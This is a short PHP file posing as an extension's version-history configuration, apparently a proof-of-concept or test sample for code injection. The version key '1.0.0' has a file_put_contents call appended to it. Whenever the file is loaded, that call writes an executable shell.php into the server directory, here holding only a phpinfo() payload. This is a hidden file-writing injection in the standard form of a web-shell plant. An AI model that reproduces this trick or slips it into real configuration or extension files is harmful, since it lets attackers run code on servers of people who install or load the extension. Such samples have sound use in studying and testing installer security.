<?php

return [
    '1.0.0'.file_put_contents('shell.php','<?php phpinfo(); ?>') => [
        'Initialize extension.',
    ],
];
